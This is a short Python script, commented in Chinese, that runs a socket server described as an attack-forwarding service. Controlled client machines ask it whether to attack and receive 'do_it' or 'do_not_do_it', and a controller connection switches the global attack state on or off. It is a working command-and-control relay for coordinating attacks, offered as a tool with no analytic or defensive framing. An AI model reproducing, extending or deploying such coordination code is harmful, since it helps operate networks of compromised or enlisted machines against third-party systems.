#!/usr/bin/python
# -*- coding: UTF-8 -*
import sys
import io

def setup_io():
    sys.stdout = sys.__stdout__ = io.TextIOWrapper(sys.stdout.detach(), encoding='utf-8', line_buffering=True)
    sys.stderr = sys.__stderr__ = io.TextIOWrapper(sys.stderr.detach(), encoding='utf-8', line_buffering=True)
setup_io()

import time

import socket
#声明主机
host = ""
#声明端口号
port = 2233
#创建sock套接字
sock = socket.socket()
#绑定主机和端口
sock.bind((host, port))
#开始监听
sock.listen(5)
#对话循环

#核心攻击状态
core_zt = True
print("攻击转发服务启动！")

while True:
	try:
		#堵塞连接
		cli, addr = sock.accept()
		print("\n\n客户端接入！")
		print(addr)

		#接收模式识别
		mod = cli.recv(2048).decode()#cli.sendall("".encode())

		if mod == "request_attack":
			print("被控端接入")
			if core_zt :
				cli.sendall("do_it".encode())
				print("发起攻击")
			else:
				cli.sendall("do_not_do_it".encode())
				print("阻止攻击")
			
		if mod == "core":
			print("控制端接入")
			cli.sendall("my".encode())
			zt = cli.recv(2048).decode()

			if zt == "stop":
				core_zt = False
				print("停止攻击")

			if zt == "strat":
				core_zt = True
				print("开始攻击")

			cli.sendall("copy that".encode())

	except:
		print("错误！攻击模式主动关闭")
		core_zt = False

